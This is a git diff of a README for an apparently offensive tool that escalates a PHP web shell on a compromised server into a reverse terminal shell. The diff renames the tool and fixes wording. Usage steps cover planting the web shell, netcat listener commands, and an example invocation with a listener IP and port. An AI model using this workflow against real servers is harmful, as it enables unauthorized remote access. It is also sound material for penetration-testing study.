@@ -1,4 +1,4 @@
-# EOF Backconnect
+# Backconnect
 A simple script to perform various methods to gain a terminal shell from a simple PHP shell.
 
 ## Introduction
@@ -10,7 +10,7 @@ After gaining a command execution shell on a server, this script will help lever
 ```
 
 ## Usage
-1. Install the command execution shell so it is publically accesible via a URL.
+1. Install the command execution shell so it is publicly accessible via a URL.
 2. Set up a listener to receive the incoming connection.
 	- `nc -nvlp {PORT}`
 	- `nc -nvlp {PORT} -s {HOST}`
@@ -25,14 +25,14 @@ After gaining a command execution shell on a server, this script will help lever
 This is the URL of the command execution shell, including the necessary injection parameter.
 
 ##### IP
-This is the listener IP for the remote server to backconnect to.
+This is the listener IP for the remote server to back-connect to.
 
 ##### PORT
-This is the listener port for the target server to backconnect over.
+This is the listener port for the target server to back-connect over.
 
 #### Example:
 ```
-./eof-backconnect.py -u http://example.com/cmd.php?cmd= -i 10.10.15.96 -p 1337
+./backconnect.py -u http://localhost/cmd.php?cmd= -i 127.0.0.1 -p 1337
 ```
 
 ## Disclaimer
